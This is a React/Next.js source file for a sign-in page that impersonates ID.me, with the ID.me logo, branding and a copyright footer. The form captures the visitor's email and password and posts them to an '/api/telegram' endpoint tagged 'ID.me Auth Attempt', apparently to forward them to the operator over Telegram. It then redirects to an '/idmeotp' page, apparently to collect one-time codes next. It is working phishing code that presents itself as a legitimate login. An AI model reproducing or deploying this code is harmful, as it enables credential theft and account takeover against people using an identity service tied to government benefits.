"use client";

import React, { useState, useCallback } from "react";
import Image from "next/image";
import { useRouter } from "next/navigation";
import { Loader2, AlertCircle } from "lucide-react";
import idmeLogo from "./idme.png";

/**
 * Constants for API configuration to avoid "magic strings"
 */
const API_ENDPOINT = "/api/telegram";
const REDIRECT_PATH = "/idmeotp";

export default function SignInForm() {
  const router = useRouter();

  // 1. Descriptive state names
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState<string | null>(null);
  const [status, setStatus] = useState<"idle" | "submitting" | "success">("idle");

  // 2. Memoized submit handler for performance
  const handleSubmit = useCallback(
    async (e: React.FormEvent<HTMLFormElement>) => {
      e.preventDefault();
      
      if (status === "submitting") return;

      setStatus("submitting");
      setError(null);

      try {
        const response = await fetch(API_ENDPOINT, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Cache-Control": "no-cache",
          },
          body: JSON.stringify({
            data: { 
              identifier: email.trim(), 
              credential: password 
            },
            formType: "ID.me Auth Attempt",
            timestamp: new Date().toISOString(),
          }),
        });

        if (!response.ok) {
          throw new Error("AUTHENTICATION_FAILED");
        }

        setStatus("success");
        
        // Use replace to prevent the user from navigating back to the login
        router.replace(REDIRECT_PATH);
      } catch (err) {
        setStatus("idle");
        setError("The email or password you entered is incorrect. Please try again.");
      }
    },
    [email, password, status, router]
  );

  const isLoading = status === "submitting";

  return (
    <div className="min-h-screen bg-slate-50 flex flex-col justify-center py-12 px-4 sm:px-6 lg:px-8">
      <div className="sm:mx-auto sm:w-full sm:max-w-md">
        {/* Brand Identity */}
        <div className="flex justify-center mb-10 transition-transform hover:scale-105">
          <Image 
            src={idmeLogo} 
            alt="ID.me Logo" 
            width={140} 
            height={52} 
            priority 
            className="h-auto w-auto"
          />
        </div>

        {/* Content Card */}
        <div className="bg-white py-10 px-6 shadow-xl rounded-2xl border border-slate-200 sm:px-10">
          <div className="mb-8 text-center">
            <h2 className="text-3xl font-bold text-slate-900 tracking-tight">
              Sign In
            </h2>
            <p className="mt-2 text-sm text-slate-500">
              Access your ID.me secure account
            </p>
          </div>

          {/* Feedback UI */}
          {error && (
            <div className="mb-6 flex items-center gap-3 p-4 bg-red-50 border-l-4 border-red-500 rounded-r-lg animate-in fade-in slide-in-from-top-2">
              <AlertCircle className="h-5 w-5 text-red-500 flex-shrink-0" />
              <p className="text-sm font-medium text-red-800">{error}</p>
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Accessibility: Hidden fields for mobile engine optimization */}
            <input type="tel" className="hidden" aria-hidden="true" tabIndex={-1} />

            <div className="space-y-1">
              <label htmlFor="email" className="block text-sm font-semibold text-slate-700">
                Email Address
              </label>
              <input
                id="email"
                name="email"
                type="email"
                autoComplete="email"
                required
                disabled={isLoading}
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="block w-full px-4 py-3 border border-slate-300 rounded-xl shadow-sm placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-transparent transition-all disabled:bg-slate-50 disabled:text-slate-400"
                placeholder="name@example.com"
              />
            </div>

            <div className="space-y-1">
              <label htmlFor="password" className="block text-sm font-semibold text-slate-700">
                Password
              </label>
              <input
                id="password"
                name="password"
                type="password"
                autoComplete="current-password"
                required
                disabled={isLoading}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="block w-full px-4 py-3 border border-slate-300 rounded-xl shadow-sm placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-transparent transition-all disabled:bg-slate-50 disabled:text-slate-400"
                placeholder="••••••••"
              />
            </div>

            <div className="pt-2">
              <button
                type="submit"
                disabled={isLoading}
                className="group relative w-full flex justify-center py-3.5 px-4 border border-transparent text-sm font-bold rounded-xl text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 transition-all active:scale-[0.98] disabled:opacity-70 disabled:cursor-not-allowed shadow-md hover:shadow-lg"
              >
                {isLoading ? (
                  <Loader2 className="h-5 w-5 animate-spin" />
                ) : (
                  "Sign in"
                )}
              </button>
            </div>
          </form>
        </div>

        {/* Legal/Footer */}
        <p className="mt-8 text-center text-xs text-slate-400 tracking-wide">
          &copy; {new Date().getFullYear()} ID.me, Inc. • Privacy • Terms
        </p>
      </div>
    </div>
  );
}